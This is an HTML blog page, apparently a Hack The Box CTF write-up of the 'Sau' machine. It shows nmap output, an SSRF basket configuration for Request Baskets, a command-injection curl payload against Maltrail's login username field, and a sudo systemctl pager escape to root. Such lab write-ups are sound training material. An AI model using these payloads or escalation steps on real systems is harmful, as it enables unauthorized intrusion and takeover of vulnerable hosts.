@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Sau :: Welcome</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Indulge in the ultimate cyber escapade with &#39;Sau&#39; - an exceptionally exhilarating CTF journey." />
+<meta name="keywords" content="csrf, htb" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/sau/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Sau">
+<meta property="og:description" content="Indulge in the ultimate cyber escapade with &#39;Sau&#39; - an exceptionally exhilarating CTF journey." />
+<meta property="og:url" content="/posts/sau/" />
+<meta property="og:site_name" content="Welcome" />
+
+  
+  
+  <meta property="og:image" content="">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-10 15:06:26 &#43;0100 &#43;01" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="blue">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    [Achux21@b0x:~]#
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">home</a></li>
+        
+      
+        
+          <li><a href="/">My-writeups</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >home</a></li>
+        
+      
+        
+          <li><a href="/" >My-writeups</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/sau/">Sau</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-10[Updated::2023-07-10]</time><span class="post-author">Achux21</span><span class="post-reading-time">3 min read (596 words)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/hack-the-box/">Hack-The-Box</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&amp;size=35&amp;pause=1000&amp;color=6A0DAD&amp;width=435&amp;lines=Sau-HackTheBox" alt="Typing SVG"></a></p>
+<p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/28702117-6795-465c-9527-a4054c414a7e" alt="image"></p>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.80 scan initiated Sun Jul  9 20:56:56 2023 as: nmap -sCV -oN Nmap -p- -vvv 10.10.11.224</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.224
+</span></span><span style="display:flex;"><span>Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.31s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2023-07-09 20:56:56 +01 <span style="color:#66d9ef">for</span> 585s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65531</span> closed ports
+</span></span><span style="display:flex;"><span>Reason: <span style="color:#ae81ff">65531</span> resets
+</span></span><span style="display:flex;"><span>PORT      STATE    SERVICE REASON         VERSION
+</span></span><span style="display:flex;"><span>22/tcp    open     ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp    filtered http    no-response
+</span></span><span style="display:flex;"><span>8338/tcp  filtered unknown no-response
+</span></span><span style="display:flex;"><span>55555/tcp open     unknown syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     Request
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">302</span> Found
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Location: /web
+</span></span><span style="display:flex;"><span>|     Date: Sun, <span style="color:#ae81ff">09</span> Jul <span style="color:#ae81ff">2023</span> 20:05:50 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">27</span>
+</span></span><span style="display:flex;"><span>|     href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/web&#34;</span>&gt;Found&lt;/a&gt;.
+</span></span><span style="display:flex;"><span>|   HTTPOptions: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>|     Allow: GET, OPTIONS
+</span></span><span style="display:flex;"><span>|     Date: Sun, <span style="color:#ae81ff">09</span> Jul <span style="color:#ae81ff">2023</span> 20:05:51 GMT
+</span></span><span style="display:flex;"><span>|_    Content-Length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port55555-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>7/9%Time<span style="color:#f92672">=</span>64AB131E%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>Ge
+</span></span><span style="display:flex;"><span>SF:tRequest,A2,<span style="color:#e6db74">&#34;HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Sun,\x2009\x20Jul\x202
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:023\x2020:05:50\x20GMT\r\nContent-Length:\x2027\r\n\r\n&lt;a\x20href=\&#34;/we
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:b\&#34;&gt;Found&lt;/a&gt;\.\n\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericLines,67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x20Req
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0close\r\n\r\n400\x20Bad\x20Request&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,60,<span style="color:#e6db74">&#34;HTTP/1\.0\x2020
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Sun,\x2009\x20Jul\x202
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:023\x2020:05:51\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,
+</span></span><span style="display:flex;"><span>SF:67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SF:%r<span style="color:#f92672">(</span>Help,67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:equest&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq,67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\n400\x20Bad\x20Request&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServerCookie,67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSessionReq,67,<span style="color:#e6db74">&#34;H
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Ke
+</span></span><span style="display:flex;"><span>SF:rberos,67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:quest&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sun Jul  9 21:06:41 2023 -- 1 IP address (1 host up) scanned in 584.89 seconds</span>
+</span></span></code></pre></div><p><a href="https://github.com/darklynx/request-baskets"> POC</a></p>
+<p>During my reconnaissance phase, I discovered a website that utilizes the Request Baskets service.</p>
+<p>This web service provides me with the flexibility to collect and examine HTTP requests through either a RESTful API or a user-friendly web interface</p>
+<p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/560e444d-8bd9-4daa-82ee-7dd6e301d54f" alt="image"></p>
+<p>An intriguing detail we observed is that the service we stumbled upon is running an outdated version, whereas the most recent version available is 1.2.3.
+This divergence raises the possibility of potential vulnerabilities that we can exploit during our exploitation process.</p>
+<p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/77afb146-755e-423f-a258-df1685262d36" alt="image"></p>
+<p>While conducting the vulnerability assessment for this particular system version, I discovered an SSRF (Server-Side Request Forgery) vulnerability.
+This vulnerability exposes a significant risk as it allows for the unauthorized disclosure of confidential information, including port enumeration.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;forward_url&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:80/test&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;proxy_response&#34;</span>: <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;insecure_tls&#34;</span>: <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;expand_path&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;capacity&#34;</span>: <span style="color:#ae81ff">250</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Following the outlined steps in the documentation, I proceeded to create a new basket.
+However, I deviated from the default GET request method and modified it to a POST request, making the following adjustments.</p>
+<p>By leveraging the SSRF vulnerability, I successfully created a targeted route that allowed me access.
+Within this route, I proceeded to exploit the SSRF vulnerability further, capitalizing on its weaknesses.</p>
+<p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/206e245e-494a-4b22-be1b-e8c6a94c4074" alt="image"></p>
+<p><code>http://10.10.11.224:55555/web/achux21</code></p>
+<p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/0f5c895b-8629-4e65-aaab-5758f0eb10b7" alt="image"></p>
+<p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/f00be81b-f91e-4cda-9769-bcab86f16cb8" alt="image"></p>
+<p>While accessing the route generated by exploiting the SSRF vulnerability, we came across the Maltrail application.
+Maltrail serves as a robust system for detecting and analyzing malicious network traffic.
+It relies on public lists containing suspicious and malicious traces, as well as static traces obtained from reports by various antivirus providers
+However, it is essential to highlight that the version of Maltrail we encountered is outdated, potentially implying the presence of unaddressed vulnerabilities.</p>
+<p><a href="https://github.com/stamparm/maltrail">Matrail V0.53</a></p>
+<p>During the analysis, I discovered an unauthenticated command execution vulnerability within the Maltrail application.
+This vulnerability resides in the subprocess.check_output function, specifically in the file mailtrail/core/httpd.py.
+The root cause of this vulnerability is a command injection flaw present in the params.get(&ldquo;username&rdquo;) parameter.</p>
+<p><a href="https://vulners.com/huntr/BE3C5204-FBD9-448D-B97C-96A8D2941E87">https://vulners.com/huntr/BE3C5204-FBD9-448D-B97C-96A8D2941E87</a></p>
+<p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/3bde8930-a81e-4cd6-9122-698c80fcd9fc" alt="image"></p>
+<p>By exploiting this vuln we could have a remote code execution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;http://hostname:8338/login&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --data <span style="color:#e6db74">&#39;username=;`id &amp;gt; /tmp/bbq`&#39;</span>
+</span></span></code></pre></div><p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/465aa762-6566-4472-bb11-f89508166417" alt="image"></p>
+<h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>it&rsquo;s time to focus on privilege escalation.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>sudo  /usr/bin/systemctl status trail.service
+</span></span><span style="display:flex;"><span>!sh
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>sudo  /usr/bin/systemctl status trail.service
+</span></span><span style="display:flex;"><span>!sh
+</span></span></code></pre></div><p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/9a551f35-dead-4e8e-9715-9c248c2d006a" alt="image"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/28b72b20-2633-492a-b25c-ab9a253db14a" alt="image"></p>
+<p>BYE</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/catpictures/">
+                <span class="button__text">Cat Pictures 2</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Achux21</span>
+    
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
